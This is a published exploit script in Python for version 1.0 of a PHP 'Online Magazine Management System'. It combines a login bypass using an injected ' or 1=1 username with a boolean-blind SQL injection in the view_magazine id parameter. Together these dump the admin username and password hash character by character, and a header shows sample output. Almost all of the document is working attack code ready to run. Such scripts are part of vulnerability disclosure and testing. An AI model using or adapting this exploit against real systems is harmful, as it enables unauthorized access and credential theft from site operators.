# Exploit Title: SQL Injection on view_magazine leading to credential dumping
# Date: 14/12/2021
# Exploit Author: evdaez
# Vendor Homepage: https://www.sourcecodester.com/php/15061/online-magazine-management-system-php-free-source-code.html
# Software Link: https://www.sourcecodester.com/download-code?nid=15061&title=Online+Magazine+Management+System+in+PHP+with+Free+Source+Code
# Version: 1.0
# Tested on: XAMPP Windows 10
'''
[+] Login successful.
[+] Cookie: lg8jt3lfa79shufij3fea9dc8e
[+] Guessing username length...
[+] Length of username: 5
[+] Guessing username...
[+] Username: admin
[+] Guessing password length...
[+] Length of password: 32
[+] Guessing password...
[+] Password: 0192023a7bbd73250516f069df18b500
'''
import requests
from os import system

def clear_screen():
    system("cls")

def login(target, proxies, username, password):
    data = {
        "username": username,
        "password": password
    }
    
    sess = requests.session()
    login_url = f"http://{target}/magazines/classes/Login.php?f=login"
    req = sess.post(login_url, data=data, proxies=proxies, verify=False)

    if "success" in req.text:
        print("[+] Login successful.")
        print(f"[+] Cookie: {sess.cookies['PHPSESSID']}")
        return sess
    else:
        print("[-] Login failed.")
        raise SystemExit

def exploit(sess, target, proxies):
    print("[+] Guessing username length...")
    for i in range(1, 33, 1):
        url = f"http://{target}/magazines/admin/?page=magazines/view_magazine&id="
        length_of_username_sqli = f"1' AND (select length(username) from users where id=1)={i} -- -"
        url += length_of_username_sqli

        req = sess.get(url, proxies=proxies, verify=False) 
        if "Undefined variable:" in req.text:
            pass
        else:
            print(f"[+] Length of username: {i}")
            break

    username_in_db = ""
    username_length = i
    charset = "abcdefghijklmnopqrstuvwxyz"

    print("[+] Guessing username...")
    for i in range(1, username_length+1, 1):
        for char in charset:
            url = f"http://{target}/magazines/admin/?page=magazines/view_magazine&id="
            get_username_sqli = f"1' AND SUBSTRING((SELECT USERNAME FROM users WHERE id=1), {i}, 1) = '{char}' -- -"
            url += get_username_sqli

            req = sess.get(url, proxies=proxies, verify=False)
            if "Undefined variable:" in req.text:
                pass
            else:
                username_in_db += char
                print(username_in_db, end='\r',flush=False)
                break

    print(f"[+] Username: {username_in_db}")

    print("[+] Guessing password length...")
    for i in range(1, 48, 1):
        url = f"http://{target}/magazines/admin/?page=magazines/view_magazine&id="
        length_of_password_sqli = f"1' AND (select length(password) from users where id=1)={i} -- -"
        url += length_of_password_sqli

        req = sess.get(url, proxies=proxies, verify=False) 
        if "Undefined variable:" in req.text:
            pass
        else:
            print(f"[+] Length of password: {i}")
            break

    password_in_db = ""
    password_length = i
    charset = "01234567890abcdefghijklmnopqrstuvwxyz"
    
    print("[+] Guessing password...")
    for i in range(1, password_length+1, 1):
        for char in charset:
            url = f"http://{target}/magazines/admin/?page=magazines/view_magazine&id="
            get_password_sqli = f"1' AND SUBSTRING((SELECT password FROM users WHERE username='{username_in_db}'), {i}, 1) = '{char}' -- -"
            url += get_password_sqli

            req = sess.get(url, proxies=proxies, verify=False)
            if "Undefined variable:" in req.text:
                pass
            else:
                password_in_db += char
                print(password_in_db, end='\r',flush=False)
                break

    print(f"[+] Password: {password_in_db}")

if __name__ == "__main__":
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"https://127.0.0.1:8080"
    }   

    target = '127.0.0.1'
    username = 'test\' or 1=1 -- -'
    password = ''

    clear_screen()
    sess = login(target, proxies, username, password)
    exploit(sess, target, proxies)
